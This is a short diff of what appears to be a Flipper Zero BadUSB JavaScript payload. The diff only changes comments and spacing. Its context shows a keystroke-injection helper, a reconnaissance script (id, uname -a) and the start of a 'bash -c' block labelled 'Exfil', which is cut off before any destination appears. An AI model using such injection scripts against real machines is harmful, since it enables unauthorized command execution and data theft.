@@ -35,13 +35,15 @@ let layout = "en-US";
 
 // ************
 // Executes BadUSB commands with the ability to print to the F0 screen as the script executes, then have an optional delay.
+//
+// 'command' is required, 'message' and 'delay' are optional
 function sendToConsole(script)
 {
     // script.message, script.command, script.delay
     for (let i = 0; i < script.length; i++) {
         if(script[i].message) print(script[i].message); // F0 screen message
-        badusb.println(script[i].command); // BadUSB command to execute
-        if(script[i].delay) delay(script[i].delay); // Delay
+        badusb.println(script[i].command);              // BadUSB command to execute
+        if(script[i].delay) delay(script[i].delay);     // Delay
     }
 }
 
@@ -53,6 +55,8 @@ let size = 8 * 1024 * 1024;
 
 // ************
 // Primary Script Definition - This example does not include code to elevate privledges
+//
+// 'command' is required, 'message' and 'delay' are optional
 let primary = [
     { message: "Executing: id", command: "id", delay: 5000 },
     { message: "Executing: uname -a", command: "uname -a", delay: 1000 },
@@ -60,6 +64,8 @@ let primary = [
 
 // ************
 // Secondary Script Definition (Exfil)
+//
+// 'command' is required, 'message' and 'delay' are optional
 let secondary = [
     { command: "bash -c '", delay: 10 },
     { command: "img=" + imageName + ";", delay: 10 },
